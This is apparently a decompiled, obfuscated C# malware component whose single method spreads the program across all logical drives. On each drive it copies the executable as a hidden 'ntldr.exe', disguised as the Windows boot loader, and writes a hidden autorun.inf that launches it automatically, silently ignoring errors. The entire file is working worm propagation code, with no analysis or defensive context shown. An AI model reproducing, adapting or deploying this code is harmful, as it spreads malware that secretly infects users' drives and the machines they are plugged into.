using System;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns1;

namespace ns4;

internal sealed class Class16
{
	public static void smethod_0()
	{
		string programFiles = ((ServerComputer)Class2.smethod_0()).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		for (int i = 0; i < array.Length; i = checked(i + 1))
		{
			programFiles = array[i];
			try
			{
				if (!File.Exists(programFiles + "ntldr.exe"))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "ntldr.exe");
				}
				StreamWriter streamWriter = new StreamWriter(programFiles + "autorun.inf");
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("open=ntldr.exe");
				streamWriter.WriteLine("shellexecute=ntldr.exe");
				streamWriter.Close();
				File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
				File.SetAttributes(programFiles + "ntldr.exe", FileAttributes.Hidden);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
